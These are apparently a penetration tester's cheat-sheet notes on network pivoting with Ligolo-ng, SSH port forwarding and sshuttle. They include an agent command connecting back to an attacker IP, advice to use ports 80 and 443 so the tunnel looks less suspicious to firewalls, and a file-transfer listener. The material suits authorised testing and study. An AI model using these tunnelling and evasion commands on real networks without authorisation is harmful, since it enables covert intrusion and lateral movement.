
**Ligolo-ng** 

 allows pentesters to establish tunnels from a reverse TCP/TLS connection using a **tun interface**

install  proxy
https://github.com/nicocha30/ligolo-ng/releases

```sh
sudo ip tuntap add user kali mode tun ligolo

sudo ip link set ligolo up

#OPTIONAL
interface_create --name "evil-cha"

#80 and 443 are excellent choices because they are commonly allowed by firewalls and appear less suspicious due to their frequent use in legitimate web traffic
./proxy -selfcert -laddr 0.0.0.0:<proxy_port>
```

use for the Client 
https://github.com/nicocha30/ligolo-ng/releases


```sh
./agent -connect <attacker_IP>:11601 -ignore-cert
```


Manual routing setup
```sh
#display the network configuration of the agent
ifconfig
# list availabe sessions  
session 

#Represents the subnet of the internal network you want to route traffic to
sudo ip route add <internal_subnet> dev ligolo

#starting the session as the user we set the agent.exe for 
start
```

Create another listener

```
listener_add --addr 0.0.0.0:1235 --to 0.0.0.0:8000
```

Now transfer files by using the ip of the machine that was tunneled from earlier and use port 1234. Create a python server on port 8000 in kali.
## SSH Port Forwarding

Specific port forwarding 
```
ssh -L <local_port>:<target_host>:<target_port> <user>@<ip>
```

dynamic port
```sh
ssh <user>@<ip> -D <target_port>
```

Can be scanned like so :

```
nmap -v -sV -p1234 localhost
```

## Sshuttle

SSH pivoting
```
sudo sshuttle -r ubuntu@10.129.202.64 172.16.5.0/23 -v 
```

```
sshuttle -r root@10.200.98.200 --ssh-cmd "ssh -i key.rsa" 10.200.98.0/24 -x 10.200.98.200 &
```
### References 

https://github.com/nicocha30/ligolo-ng/releases
